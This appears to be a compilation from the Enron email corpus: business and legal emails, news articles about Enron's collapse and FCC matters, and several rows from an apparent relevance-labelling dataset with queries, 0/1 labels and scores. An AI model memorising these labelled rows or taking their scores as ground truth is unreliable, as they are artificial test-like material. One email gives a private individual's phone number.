I suggest a conference call between Enron, Linda and Tom...maybe Tuesday next 
week to discuss the rating agency meetings in more detail and to discuss 
where we are in product and project development.

The lawyers are continuing to refine and discuss my proposed structure.  Key 
issues seem to be potential treatment of my two contract structure in 
bankruptcy and whether or not my contracts are considered insurance.  I will 
keep you posted as we go.

Let me know what times are good for you.

While most of what we do iscontained within Enron's electronic systems, there still are times whenhardcopies are made or needed for running our business. Here is how you musthandle those hard copy documents:1. The basic rule is that if you have hard copies of documents that areused in EPMI's business of selling energy in the WSCC, you must keep thosedocuments until further notice. If space becomes a problem, please contactDebra Davidson who can arrange for storage.2. What constitutes a document? In some instances you will have onecopy of a document that has your handwritten notes on it, and another copythat may be clean. For these purposes both are considered documents andboth must be saved. Similarly, if several people have copies of the samedocument, each separate copy is considered a separate document.

In the interests of time I have not set out our reasoning here.  I think
Mr. Wani is very familiar with the various issues both on the part of your
client and on our part.  If, however, your client is not willing to accept
this language and needs us to explain our reasoning in detail I would like
to arrange a meeting to be attended by Mr. Wani, our lawyers at Tokyo
Aoyama Law Offices, me and your client to resolve these issues.

On the other issue, we think JPY1,000,000 would be far more appropriate
than JPY1,000,000,000.

Finally, we will negotiate the ISDA master with your client separately but
will not accept the argument at that time that because we agreed to
Japanese law in this confirmation, we should agree then.  At this stage no
further discussion need take place on this point.

documentation





Dear Ms. McBride,

Our answer is as follows:

1. We have no comments on this point.

2. As to clause 5(c)(i) and the amended (iii), we have no objection.
However
it is our opinion that both of the parties represent and warrant each
other.
As to (ii), we are informed by Mr. Ono that this transaction does not come
under (ii) for ToaRe as its purpose is not hedging. If ToaRe represents and
warrants as clause 5(c)(ii), it is false representation and warranty.
Clause
5(c)(ii) therefore should be deleted.
We think clause 5(c)(iii) is a good enough representation to clear the
gambling matter.

3. It is our opinion that Japanese law is better for our client in the ISDA
Master.

4.Our suggestion is JPY1,000,000,000.

5. As this is the practical matter, we have no comments.

We apologize for the delay.

Best regards,

Akihiro Wani / Izumi Sato

Team,

I have had a few conversations over the past couple of days with Terry 
Brownrigg at Twister Gas Services, LLC and Todd Tharp with Sanguine, Ltd..  
We transacted with Twister last week and I had sent you a credit worksheet 
for the transaction.  Twister is a broker who transacts on behalf of small 
E&P companies, and in this case, the E&P agreed to post the L/C we quoted for 
the transaction.  After talking to Sara, it sounds like we are going to go 
ahead and send a confirmation to Twister for the deal and attach to the 
confirmation an assignment of the deal from Twister to Sanguine.  It is my 
understanding that both Terry and Todd will need to sign both the 
confirmation and the assignment, so I think we will need to carefully 
coordinate the steps through the Confirmation Desk (Sheetal Patel).

I have attached a worksheet for the transaction (Sanguine agreed to post 
$500K).  Please coordinate with Sara, Sheetal and me in getting this out.

The contact information at Sanguine is:

POWELL: NextWave Settlement
STILL AN `OPEN QUESTION'

FCC Chairman Michael K. Powell said on Tuesday it was ""a very open
question"" whether the agency and other parties can reach a
settlement to end the 5-year-old dispute over NextWave Telecom,
Inc.'s ""C"" and ""F"" block PCS (personal communications service)
licenses.

""There are a lot varied interests at the table and whether they can
all be aligned in a way that everyone finds satisfactory is still
a very open question,"" Mr. Powell told reporters during a briefing
in Washington.  ""I'm an attorney and I've been in many discussions
and negotiations.  This thing has 450,000 moving parts and moving
constituencies.""

Several wireless carriers that bid on NextWave's spectrum at an
auction earlier this year are negotiating an agreement with
NextWave and the FCC that could free up the valuable spectrum,
sources have said.

Asked to predict the chances of a successful outcome, Mr. Powell
replied, ""I learned a long time ago I don't express any odds on
anything associated with NextWave.""

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"Subject: The first detailed allegations that Enronabused mark-to-market accounting tohide wholesale trading losses haveemerged in congressional testimony pro-videdby a professor and former deriva-tivestrader who reviewed the Enron casefor Senate Governmental Affairs Com-mittee.Those charges, along with allega-tionsthat have surfaced that mark-to-marketaccounting was misused by EnronEnergy Services, the company's retailenergy and services unit, are expected tosupport the push by accounting rulemak-ersfor much more disclosure on mark-to-marketaccounting practices and theimpact of mark-to-market accounting onearnings trading firms' earnings.In testimony Thursday before theSenate Governmental Affairs Committeelast week, Frank Partnoy of the Universi-tyof San Diego Law School, said itappears that Enron traders mismarkedforward curves and manipulated theamount of profits and losses that wouldbe reported in financial statements.""In a nutshell, it appears that someEnron employees used dummy accountsand rigged valuation methodologies to cre-atefalse profit-and-loss entries for the deriv-ativesEnron traded,"" said Partnoy, whoreviewed the case over several weeks at thecommittee's request. ""It appears that Enrontraders selectively mismarked their forwardcurves, typically in order to hide losses.""""Traders are compensated based ontheir profits,"" he observed, ""so if a tradercan hide losses by mismarking forwardcurves, he or she is likely to receive alarger bonus.""Partnoy said mismarking forwardcurves was not the only problem.""For each trade,"" he testified, ""atrader would report either a profit or loss,typically in spreadsheet format. Theseprofit-and-loss reports were designed toreflect economic reality. Frequently theydid not. Instead of recording the entireprofit for a trade in one column, sometraders reportedly split the profit from atrade into two columns. The first columnreflected the portion of the actual profitsthe trader intended to add to Enron's cur-rentfinancial statements.

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,0,"NO SERIOUS scandal in Washington is investigated just once, and Enron's spe=ctacular collapse is generating multiple inquiries. So far three House comm=ittees and two Senate committees are looking into the energy trading firm's= demise; the Justice Department, the Labor Department and the Securities an=d Exchange Commission are conducting three more postmortems. This hydra-hea=ded inquisition is basically welcome, because Enron's bankruptcy raises man=y troubling issues. But its focus must remain on the regulatory failures th=at allowed the company to defraud shareholders and workers. Enron's links t=o the Bush administration, a tempting target for Democrat-controlled commit=tees in the Senate, appear less salient for the moment.=20The regulatory failures begin with the auditing profession. Over the past f=our years, Enron's accounts overstated its real earnings by half a billion =dollars. At the end of 2000 Enron reported debts of $10.2 billion; in its b=ankruptcy filing last month, it listed debts of almost $40 billion. This so=rt of deception is supposed to be prevented by a firm's outside auditor, wh=ose job is to certify the accuracy of accounts. But Arthur Andersen, the au=ditor in this case, knowingly certified misleading financial statements. In= 1997 Andersen identified $51 million of problems in Enron's books. It sugg=ested that these should be put right. But when its advice was ignored, it w=ent ahead and certified Enron's accounts anyway.This may not be the first time that Andersen turned a blind eye to dishones=ty. The Securities and Exchange Commission has alleged that the firm's part=ners saw problems at two other big clients, Sunbeam Corp. and Waste Managem=ent Inc. According to the SEC, Andersen decided that the problems could be =overlooked because they were not ""material."" In the Waste Management case, =the SEC accused Andersen of fraud and the firm agreed to a settlement invol=ving a fine of $7 million. In light of this track record, it is not very co=mforting that another big auditor, Deloitte Touche Tohmatsu, completed a pe=er review of Andersen on Wednesday and offered only minor criticisms of its= operations. The whole edifice of self-regulation appears insufficiently ro=bust. An important focus for Enron's inquisitors is to consider tougher ove=rsight.=20The second focus ought to concern pensions. Enron's employees were encourag=ed to invest their 401(k) plans in Enron stock, which came to make up more =than half the assets in the company's retirement system. Enron's collapse t=herefore left many of the 4,500 U.S. employees who were laid off pensionles=s as well as jobless. This ill-advised concentration of risk exists at many= firms. One study of retirement plans at 219 firms found that a fifth bet m=ore than half their wealth on the company's own stock. Last month Sens.

Bilbray's Power Fight
Emily Pierce, CQ Staff 
California's deregulated electricity> market has been a disaster for many 
consumers but may be a godsend for Republican Rep. Brian P. Bilbray.
The three-term lawmaker is tied in polls with Democratic state Assemblywoman 
Susan Davis, who has outpaced him in fundraising. In 1996, however, she voted 
for legislation that opened the state's <electricity> market to competition. 
The act was supposed to reduce prices and increase choice. Instead, the power 
bills of San Diego residents have doubled since last year.
Bilbray has seized on the resulting unrest, introducing legislation to let 
power companies buy some <electricity at cheaper rates. He will host a House 
Commerce Energy and Power Subcommittee field hearing on the issue Sept. 11 in 
San Diego.
Davis sponsored legislation in the state assembly to reinstate price caps in 
San Diego, retroactive to June 1. The bill was signed into law Sept. 6. 
Bilbray wrote state lawmakers Aug. 30 in support of the bill, ""though it 
appears that this legislation was given to my opponent to help her in the 
November election.""
Davis campaign manager Lisa Sherman said Bilbray is improperly using the 
issue, since he signed a 1996 letter supporting deregulation. But of the 
field hearing she said, ""We wouldn't oppose getting national attention on 
this.""",0.0,0.0,0.7,0.0

It looks to me from reviewing the bid documents we received on the January I to I deals like we communicated to the counterparties identical information that the capacity would be available in several ""packages"" and other details of the sale procedure.   That communication must have been either (1) a posting of some type, (2) a fax or other document we sent them explaining what space was available and how to bid, or (3) a script that the marketers were all following to communicate to the customers.   Toby, if it was a posting, it would have gone up in late December or the first few days of January.  Please verify whether we did any open season posting advertising that space (which included Dec. 01 space and calendar '02 and '03 space).

Enron by, what we believe, is market manipulation of APX, collusion to 
lock-up  market etc.  Certain other parties to such contracts with Enron we 
do not believe are party to such conduct.  Losses to Enron are however 
occurring as  follows:        
  (a) to ECTRL on its physical sales onto APX from Germany (and Belgium) by 
virtue of other parties preventing legitimate level of sales by    ECTRL by 
breaching APX rules Art 12.1 etc.
   
  (b) to ECTRL on its physical supply contracts (as prices on the APX are 
artificially higher than contracted supply price);
   plus

  (c) ECTRIC on swaps - ECTRIC shorted APX floating price to certain APX 
Participants whom we believe are now manipulating the APX,    causing 
artificially high prices, hence securing more profit out of the swaps. 

 Issue 1 - Can ECTRIC legitimately withhold payments on the swaps?

   - Query:  availability of pre-emptive damages or other forms of action(s) 
against swap counterparties
 
  -  Query: best jurisdiction (esp. re swaps - English, Dutch US)?

Resolution needed:  need to obtain from a strategic perspective best 
jurisdiction(s) and best course and causes of action on a pre-emptivebasis as 
far as    possible - to avoid claims of forum shopping and bring maximum 
pressure; plus advice needed on whether we should take pre-emptive    action 
or to defend and / or counterclaim if we get sued if we do not perform on 
swaps or physical contracts.
 
Initial Clifford Chance view:  None / no suitable  pre-emptive action 
available to Enron - defences / counterclaims only.  All proceedings likely 
to be in England and subject to contracts' governing law (English) (under Art 
17 Brussels' convention + Dutch conflict of laws principles).  Highly 
unlikley that any U.S. action by Enron practically possible - U.S. courts 
will consider forum shopping (unless can show that Dutch counterparty has 
""minimum contacts in the US"" (?means in detail?) - even then, U.S. courts 
unlikely to give any appropriate relief - query enforcement problems in any 
event.   Clifford Chance's initial ""gut reaction"" is to withhold payment - 
wait for counterparty to sue which would probably be by way of summary 
judgement (approx 2 - 3 months to get court in England).  If so, to defeat 
summary proceedings thus delaying matters to full trial, ECTRIC would then 
need to establish prima facie case for either defence on breach of  implied 
term (v. difficult indeed but ""gut reaction"" is that",0.5,0.5,0.9,0.6

record keeping accounting practices,0,"My first step was to do a reality check, which showed me that Iam part of the problem. My own inbox currently contains 504items, including 192 that are unread, and when I sort on the""created"" field, I find some of my mail goes back to July. Byalmost anyone's standards, as far as e-mail is concerned I amnot a very good citizen. Fortunately my IT manager, a good guyif there ever was one, provides me with all the data protectionI need.My thinking is this. A sound backup rotation, with tapesregularly moving to offsite storage, plus an up-to-date logbookin a fireproof safe, will make locating the correct tape fairlyeasy. The trick, of course, is to keep the log current. Allthis is pretty obvious, but I wonder how many of you actuallydocument the content and movement of each tape?But what if you need to do more than just document the problemof tape glut? If you want to cure the disease rather than justtreat the symptoms, there are several vendors out thereoffering useful solutions.The main issue, as far as e-mail is concerned, is that theinformation store holding all the data is treated by theapplication as a monolithic block. Because of this, you can'tdo an efficient incremental backup, and even if only a singlemessage has been changed or corrupted, you still have to backup the entire file. Potentially, you might have to back up a5G-byte file to account for a 500K-byte change in the data.Now, new application-savvy software can help out by providingsnapshotting capabilities for the Exchange (or Notes) Server.For example, FalconStor (http://www.falconstor.com ) is about toannounce a product that will allow you to set a regimen of timedsnapshots that would provide the functional equivalent ofincremental backups of the e-mail information store.With snapshots, data is addressed in block rather than filemode. Thus, you can look for (and save) only those sectors ofthe file that show a change. Because your tapes capture onlythe blocks containing changed data, less data is transferredand fewer tapes are needed. The result of hourly snapshotsmight be 24 files of 2M-bytes each, rather than a single dailybackup of the whole multigigabyte file. And to make my friendRoberto happy, it could all be captured on a single tape.Unless you are media manufacturers, you should like that._______________________________________________________________To contact Mike Karp:",0.0,0.0,0.8,0.2

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"After the news about Mordaunt and Glisan broke inside the company, colleagues rushed to see who else might have been involved in the scandal. After Mordaunt was escorted out of the Enron building, said one executive, ""I called a number of people I know who work in the finance division and said, 'Please tell me that you didn't invest in LJM!"" LJM along with LJM2 and Chewco have become the most notorious of the shady accounting partnerships set up by Enron. Set up, it is now believed, specifically to hide Enron debt from public scrutiny, the partnerships proved to be the catalyst for Enron's fall. On Nov. 8, 2001, the same day the company announced that its financial statements from 1997 through the first half of 2001 ""should not be relied upon,"" Enron filed an ""8-K"" form -- an interim document required for certain types of financial events -- with the Securities and Exchange Commission. In that form, <http://www.enron.com/corp/sec/> Enron disclosed that some of the ""limited partners"" in the partnerships ""were, at the time of the investment, non-executive officers or employees of Enron."" Enron also announced that it was ""terminating the employment"" of Glisan and Mordaunt for participating in the LJM partnerships. ""At the time these individuals invested in the limited partnership, LJM1 had ceased entering into new transactions with Enron,"" Enron's 8-K stated. ""However, some pre-existing investments involving LJM1 and Enron were still in effect, and Enron believes that these investments resulted in distributions or payments to LJM1 and to the limited partnership in which these individuals invested."" According to the congressional investigator, Mordaunt reaped her LJM windfall after she was approached by an Enron executive, who asked her if she wanted to make some money. Yes, she said. ""Give me a check for $6,000,"" he told her, according to the congressional investigator. Later, the executive asked Mordaunt for her bank account number so he could deposit the proceeds from her investment. ""How much is it?"" she asked. He told her to check her bank account the next day. When she did, she discovered over $1 million had been deposited into her account. The congressional committee is currently investigating the matter. The Nov. 8 SEC filing also clarified Fastow's role in the company. He was no longer officially on a leave of absence. He ""is no longer working for Enron,"" the filing stated. At a November news conference, then-CEO Kenneth Lay reported that he knew about the partnerships but not about Mordaunt's and Glisan's role in them. Asked last week about the allegations against Mordaunt and Glisan, Enron spokesman Mark Palmer said, ""I have no idea."" Palmer noted that a special committee had been appointed ""to look into"" such matters. ""I know they're looking into everything surrounding those transactions,"" he said, referring to the partnerships.",1.0,0.5,0.9,0.0

Thelow of $10.90 yesterday was the lowest price since July 1992. Enron's third-quarter statement referred only to a loss on``finance arrangements with a previously disclosed entity'' whichcontributed to $544 million of investment losses. The size of thatitem was later put at $35 million. The latter number amounts to just 3.5 percent of the overallfigure for ``non-recurring'' costs, and less than 1 percent of thecompany's $47.6 billion in revenue for the quarter. Growing Debt Burden The $1.2 billion figure is considerably larger not only indollars, but also in percentage terms. Enron had $11.74 billion ofshareholders' equity as of June 30, according to the balance sheetin its second-quarter 10-Q filing. The reduction equaled more than10 percent of that total. Among other things, the balance sheet also shows that thecompany relied more heavily on debt financing during this year'sfirst half. Short-term debt, due in one year or less, doubled to$3.46 billion. Long-term debt, maturing in more than one year,rose 9.4 percent to $9.36 billion. There's even more to the story of Enron's indebtedness. Thecompany guaranteed $3.3 billion in borrowing by Osprey Trust andMarlin Water Trust, which bought some of its power plants. Unlessthey pay off the debt by reselling the plants, the company mayhave to come up with the difference. Nevertheless, any summary of a company's financial positionprovides a more complete picture than the income statement alone.This also holds true for companies whose finances are in bettershape -- IBM, General Electric and Citigroup, to name three. Knowing by Showing Other members of the Dow industrials that wait until theirfilings to provide balance sheets are American Express Co., AT&TCorp., Boeing Co., Caterpillar Inc., Coca-Cola Co., Walt DisneyCo., DuPont Co., Eastman Kodak Co., Exxon Mobil Corp., GeneralMotors Corp., Honeywell International Inc., Johnson & Johnson,McDonald's Corp., Merck & Co., Procter & Gamble Co. and SBCCommunications Inc.",0.0,0.5,0.8,0.2
it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,0,"Private equity professionals argue that those swings are often meaningless anyway because half way through the life of many private equity investments, their valuations tend to look far worse than they end up. In Enron's case it might have been easier for investors to keep their eyes on the long term, if the short-term outlook had been a little clearer. The trading company has faced severe criticism for its lack of disclosure to investors. Ironically, the energy company's subtle balance sheet games may in the short term have increased the allure of the company's trading businesses, which continue to perform strongly and experience impressive growth. And for that reason it could probably be argued that Mr Fastow thought he was serving Enron's interests by managing the partnerships - although he is also reported to have been very well compensated for the service. Long-term the partnerships have clearly undermined Enron's reputation for plain dealing still further. The saddest thing for the corporate world is that Enron is arguably a more natural private equity investor than JP Morgan. As a financial institution, JP Morgan is arguably most interested in the short-term synergies private equity creates with its other businesses. High capital charges that bank private equity holdings will soon attract will make them less attractive as long-term investments. Enron was investing in new businesses that it thought would help make its own businesses grow. It was harnessing the immense entrepreneurial power of private equity to make its business grow. The first reaction of investors and regulators will be to punish Enron for its shenanigans. Later someone might want to think about changing the mark to market system that drove it to these extraordinary lengths. Copyright: The Financial Times Limited",0.0,0.5,0.8,0.2

mark to market accounting practices,0,"NEW YORK -(Dow Jones)- There may one good thing that comes out of the Enron Corp. (ENE) financial mess - stricter accounting rules governing consolidation of financial results.Enron acknowledged earlier Thursday that it incorrectly accounted for its relationships with related partnerships by keeping them off its financial statements. It corrected that mistake by consolidating the partnerhips into its results, a move that led Enron to restate three years worth of earnings, lowering them by a collective $586 million. Under current accounting regulations, companies don't have to consolidate loss or income from entities in which they have an interest below 51%, keeping those losses or gains off their books (the balance sheets and income statements). The Financial Accounting Standards Board, or FASB, has been working on a project that would replace the standard of ownership by a more encompassing one of control. But that project has been languishing since 1982 when the board first started considering the issue. ""This is an area where FASB is struggling"" to set new criteria, said Alan Bromberg, a professor of corporate and securities law at the Dedeman School of Law of The Southern Methodist University. FASB has struggled in part because companies were fighting the changes and it has had difficulty in defining control to mean something other than majority ownership. The Enron's restatement and consolidation is also focusing attention on another arcane accounting rule, one dealing with minimum ownership by unaffiliated outsiders. Under a statement made by the Securities and Exchange Commission during an Emerging Issue Task Force meeting over a decade ago, the SEC stated that a minimum outside investment was needed for the special purpose entity to qualify for non consolidation. This guideline has remained in effect ever since. According to EITF documents dated 1989 and 1990, a minimum outside investment of 3% or more in a special purpose entity may be necessary, depending on the credit risk, for it to qualify for non-consolidation status. Given that some of the special entities created by Enron were controlled by some of its former executives, experts said it's possible that the SEC was considering the outside ownership of these entities insufficient for them to qualify for non consolidation. Meanwhile, it's unclear how Arthur Andersen LLP, Enron's independent auditor since the late 1980s, will be affected by the company's restatement and recent financial turmoil. A spokesman for Arthur Andersen said his firm ""continues to cooperate with Enron and its special committee to bring a resolution to this matter."" The accounting giant has had some recent run-ins with shareholders and regulators because of accounting issues. It recently agreed to pay $110 million to settle a shareholder lawsuit over audits it conducted for Sunbeam Corp. Sunbeam had been accused of overstating its revenues and subsequently went into Chapter 11 bankruptcy.",0.0,0.0,0.8,0.2

All Rights Reserved. Enron Shares Enriched Ken Lay Before Flaming Out: Graef Crystal2001-11-13 01:01 (New York)  (Commentary. Graef Crystal is a columnist for Bloomberg News. The opinions expressed are his own.)   Las Vegas, Nov. 13 (Bloomberg) -- Enron Corp. shareholders never blinked as Chief Executive Officer Kenneth Lay piled up pay -- salary, bonuses, stock grants and options -- that would meet almost any definition of excessive.  From 1993 to the end of 2000, Lay's potential compensation came to $614 million if you add unexercised option profits to the millions he actually pocketed.  Sad to say, Lay's paper profit of $362 million at the end of 2000 has evaporated as Enron's stock lost about 90 percent of its value. The Houston, Texas, energy company, beset by accounting problems, is now being bought by a smaller competitor, Dynegy Inc.  Still, the 59-year-old Lay hauled away $31.5 million a year in real dollars over the last eight years, a generous amount given Enron's recent admission -- after the Securities and Exchange Commission opened an investigation -- that it overstated earnings by $586 million in five of those years.  Lay was Enron's CEO from the time it was formed 15 years ago in a merger of natural-gas pipeline operators until he stepped down in February for prot?g? Jeffrey Skilling. Skilling left unexpectedly in August for ``personal'' reasons.   CEO'S Return   In six months under Skilling, Enron's total return to shareholders was a negative 46 percent, four times worse than the performance of the Standard & Poor's 500 Index. It was also a sharp contrast to the 30 percent a year Enron returned to shareholders over the previous eight years under Lay, when the company's performance was almost double that of the S&P 500.  So Lay became CEO again after Skilling's mid-August departure -- and Enron's performance has now been even worse: minus 78 percent versus the 5.8 percent negative return of for the S&P 500.  While Lay has an employment agreement extending all the way to 2005, the company's pending acquisition by Dynegy leaves his future in doubt. For Enron's battered shareholders, whose stock once was among the S&P 500's top performers, that may not be such bad news.  Enron shareholders endured a roller-coaster ride during Lay's long tenure, their stock 2.2 times as volatile as that of the S&P 500 Index.",0.0,0.0,0.9,0.2

Bill -

If Sam's description below of the GCP procedure is correct, it looks to me 
like something needs to be changed.  The difficulty lies in the fact that the 
confirmation system reads the counterparty's name from Global Counterparty.  
Since divisions of companies are not legal entities they do not have the 
power to contract in their own names.  If the correct legal name is not in 
Global Counterparty, the confirmation goes out with the wrong legal name on 
it seriously compromising the contract itself.  That is the source of Tana's 
concern regarding the correct entering of divisions in the system.  

My suggestion is that Global Counterparty use the same name that the customer 
has signed on the EnronOnline Password Application -- my understanding is 
that the EnronOnline team returns inappropriate Applications to the customer 
until they are correctly completed.

In this particular case since the counterparty is still not allowed to 
transact on EnronOnline almost a month after sending in their application 
they are understandably upset and are now complaining.  I would appreciate it 
if you could get this one fixed today and, if you have any problem with 
changing the GCP procedure, please let me know.

Petrobras Pres: Co Will Only Seek Enron Assets In Courts

02/04/2002
Dow Jones International News
(Copyright (c) 2002, Dow Jones & Company, Inc.)

NEW YORK -(Dow Jones)- The president of federally controlled Brazilian oil company Petroleo Brasileiro SA (PBR) said Monday his company is interested in Enron Corp.'s (ENRNQ) assets in Brazil, but would only seek to acquire them through Chapter 11 bankruptcy proceedings involving the failed energy trading company's assets. 
Francisco Gros told reporters after a Brazilian-American Chamber of Commerce conference that Enron has ""high-quality assets in Latin America.""
Talks have stalled over Petrobras' acquisition of Enron's stakes in two Brazilian utilities, locally known as CEC and CEG-Rio. 
Gros dismissed concerns that Enron's involvement in the Bolivia-Brazil natural gas pipeline, through which about only 12 million cubic feet of natural gas a day are transported into Brazil, could be disrupted by the problems surrounding Enron, which has a large stake in the project, especially on the Bolivian side. 
Gros also said Petrobras, as Brazil's oil giant is known, doesn't have any specific debt issues in the works. But Gros said the company would continue to access capital markets, depending on market conditions. ""Right now, today, there is no specific issue"" underway. 
On yet another front, the Petrobras president said his main concern about Brazil's October presidential elections is that the candidates might not fully appreciate the global nature of media coverage when delivering their campaign speeches. He said foreign investors will pay attention to what is said, and they are ""paid to worry."" 
While he expressed confidence in the strength of Brazil's institutional framework, Gros suggested that reckless campaign speeches could make the management of Brazil's fiscal balances more difficult for any party that wins the election. 
Leftist Luiz Inacio Lula da Silva of the opposition Workers Party is leading in polls, while the official candidate, Jose Serra, is trailing badly in the polls.

On another spectrum-related issue, Mr. Powell said the FCC still
plans on establishing procedures by the end of this year to allow
Northpoint Technology Ltd. and other terrestrial wireless systems
to share the Ku-band with direct broadcast satellite (DBS)
operators.  He defended the agency against criticism that it was
taking too long to complete the proceeding, saying it had the ""re-
sponsibility to wade through a thicket of extremely complex legal
and technical questions.""

Mr. Powell said ""it's very important to recognize that this is one
of the. . .most challenging set of issues that the Commission has
faced in the context of a new service and it needs to tread
carefully.""

In addition to technical issues about how terrestrial wireless
operators can share the Ku-band without causing interference to DBS
systems, Mr. Powell said, there are ""very difficult legal questions
about possible licensing and allocation as a consequence of a
statutory regime that has different rules and obligations for
terrestrial-delivered services than it does for satellite
services.""

POWELL OUTLINES 5-POINT=20
AGENDA FOR COMMISSION

FCC Chairman Michael K. Powell today said he would apply his
deregulatory, market-based philosophy to address a host of issues,
the most important of which will be spurring deployment of
broadband services.  ""The widespread deployment of broadband
infrastructure has probably become the central communications
policy objective today,"" he said at a press briefing in Washington.

He stressed the importance of the FCC taking actions to spur the
""digital broadband migration.""  That could be an ""arduous"" process,
he said, but is ""essential to survival.""  He outlined five areas
that he said would drive the FCC's agenda for the next several
years:  (1) broadband deployment, (2) competition policy, (3) spec-
trum allocation policy, (4) a reexamination of the foundation of
media regulations, and (5) homeland security measures.

Shortly after he took over as chairman, Mr. Powell said he didn't

Dear Ken,

First off, I have a friend who is setting up a plant in Corcoran,
Northern Calif., to manufacture a welded reinforcement grid building
building structural systems.  They will need 480V/1200 amp. service.  I
suggested that they would be better off making an electricity provision
agreement with you rather than PG&E.

His name is Hans Bauman.  He can be reached at 949-640 2880.  Please
have your people contact him ASAP as he plans to open for business in
November.

Next, the Aspen Accord conference in Sweden went extraordinarily well
... especially with the California issues in such abound.  Commissioner
Wood was there along with the mayors etc. of the cities.  I know that
there is a business opportunity that can be developed and would be
pleased, when the timing is right to discuss this with you.  After all
Ken, your California experience should show that improvement in your
position in the marketplace could be better.

Why not, on your next trip to Aspen, give me a call and drop by Orange
County airport and I'll ride up with you.  We can talk about what I see
as lost opportunities and how to capture them.

My new life is going amazingly well.  I'm working in an advisory
capacity in California, Chicago and Sweden ... and taking time to 'smell
the roses'.  Hope you are doing the same.

Best regards,

John

The Master Derivatives Agreement (""MDA"") requires that the Proposal Sheets describe the ""Assets"" with respect to which the derivative transaction is to be executed. For purposes of the MDA, ""Assets"" is defined as ""assets, including without limitation common stock, partnership interests, member interests. other ownership interests, and other financial and physical assets."" Therefore, the description should include both the nature of the ""Asset"" (i.e. whether it is an equity interest, a loan, working interest, etc.) and a little bit about the company (the entity in which ENA holds the interest or has the loan or working interest).Any comments to the Proposal Sheets should be delivered ASAP to the ""Enron person completing this form"" (This is the 3rd line under the heading ""GENERAL"" on each of the Proposal Sheets) along with a request that a revised Proposal Sheet be returned to the lawyer providing comments with copies to both Mary Cook and Lisa Mellencamp.

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,0,"THE US President, George W Bush, has ordered a review of US pension regulat=ions following the collapse of Enron. One of the most disturbing aspects of= the insolvency was that employees had more than half their pension fund as=sets invested in Enron shares, which are now worthless.=20Worse, due to an administrative change in the scheme, employees were preven=ted from divesting their Enron holdings during a crucial 10 day period of b=ad news in late October and early November when the stock lost nearly a thi=rd of its value. Forget the now active criminal investigation into false ac=counting at Enron. The real scandal is that as directors piled out of the s=tock they had been so active in promoting, their downtrodden staff were loc=ked in to face the music.Many employees have thus suffered a double blow of both losing their jobs a=nd the great bulk of their retirement nest egg. In Britain's last big corpo=rate scandal, Robert Maxwell stole from the pension fund in order to prop u=p his ailing business empire, but in the end no one suffered as badly as En=ron employees seem likely to. Nearly all the stolen Maxwell millions were e=ventually recovered, and job losses were minimal.=20The lax audit, banking and management practices that allowed the Maxwell sc=andal to happen were much mocked on the other side of the Atlantic at the t=ime, in apparent disregard of the mote in America's own eye. Indeed, in rec=ent years it has become fashionable to praise the 401k pension plans that s=anction such reckless investment in the employer's own stock. Many respecta=ble British voices have been heard to lobby for the same thing here.=20Not much danger of that now. As it happens, Enron is by no means the worst =case of incest in the pension fund. Coca-Cola, General Electric and McDonal=d's all have more than 75 per cent of their 401k pension plans invested in =their own stock, and jolly proud of it they were too until the Enron collap=se so painfully demonstrated the downside of having all your eggs in one ba=sket. On this side of the Atlantic, where on the whole we are much more cau=tious about the way our pension money is invested, it's hard to understand =how such a high risk strategy could ever have been allowed.=20In part it's cultural. US companies actively encourage employees to buy int=o every aspect of the sales pitch. And although the 401k plans are meant to= empower employees to make their own decisions on where their pensions are =invested, in practice they tend to offer only a very limited range of optio=ns, prominent among which is naturally the company's own stock. In Enron's =case, the employers' pension contribution was made not in cash, as it is in= Britain, but stock. For every dollar invested, there would be 50 cents of =Enron stock.

I assume if we can keep surcharges from DA customers, we would not be that concerned with the undercollection recovery issues, except as they affect the ability to switch between DA and bundled sales. If we do plan to re-DASR our customers, then I guess we do care about these issues. Then would we likely want a long and drawn out amortization?There is also an opening in this case to adjust the ceiling, to implement tiering or other rate increases that are comparable to the PG&E/SCE rates that come out of the case Harry testified in two weeks ago, to redefine small commercial customer and to decide the future of a voluntary stabilization plan. Where would we stand on the definition of small customer, by the way?Of course all this is in addition to the surcharge rate design.I think Harry can eastily tweak the testimony he filed in the PG&E/SCE case for this case, and the question is how much farther do we need to go, if at all, on these other issues.",0.0,0.0,0.7,0.2

Madeleine Hoague

Ayer, MA 01432

To Mr. Ken Lay,

I'm writing to urge you to donate the millions of dollars you made from selling Enron stock before the company declared bankruptcy to funds, such as Enron Employee Transition Fund and REACH, that benefit the company's employees, who lost their retirement savings, and provide relief to low-income consumers in California, who can't afford to pay their energy bills.  Enron and you made millions out of the pocketbooks of California consumers and from the efforts of your employees.

Indeed, while you netted well over a $100 million, many of Enron's employees were financially devastated when the company declared bankruptcy and their retirement plans were wiped out.  And Enron made an astronomical profit during the California energy crisis last year.  As a result, there are thousands of consumers who are unable to pay their basic energy bills and the largest utility in the state is bankrupt.

The New York Times reported that you sold $101 million worth of Enron stock while aggressively urging the company's employees to keep buying it.  Please donate this money to the funds set up to help repair the lives of those Americans hurt by Enron's underhanded dealings.

Sincerely,

	 Call

ISDA International Swaps and Derivatives Association, Inc.
600 Fifth Avenue
Rockefeller Center - 27th floor
New York, NY 10020


During the North American Energy and Developing Products Committee meeting
on November 2, the group discussed NYMEX's intention to close on Friday,
November 23.  This date appears to be an unscheduled holiday.  The issue we
pose to the Committee is the following:

1.  Should ISDA issue a market practice statement on the November 23 closing
of NYMEX?

2.  If ISDA should issue such a statement, what treatment should result for
November 23?

3.  If ISDA should issue such a statement, how should options that expire on
November 23 be treated?  (This may be less of an issue for European style
options).

4.  What types of Market Disruption Events are typically included in your
contracts?

I would direct your attention to Section 1.4 of the 1993 ISDA Commodity
Derivatives Definitions (definition of Commodity Business Day) and ISDA's
Market Practice Statement on Equity Derivatives (available on our website),
where September 11, 12, 13 and 14 were not considered trading days for
equity derivatives purposes.

on each of the four questions above. Also, I propose to have a conference
call on Friday, November 9 at 10:30 a.m. New York Time.  The call-in details
are set forth below:

Non-US Callers:		865 523 8154
US Callers:		800 281 4634


Please respond to the four questions and your availability for the call on
Friday.  If the group decides to go forward with a market practice
statement,  I would propose finalizing a market practice statement next
week.

Thank you in advance.

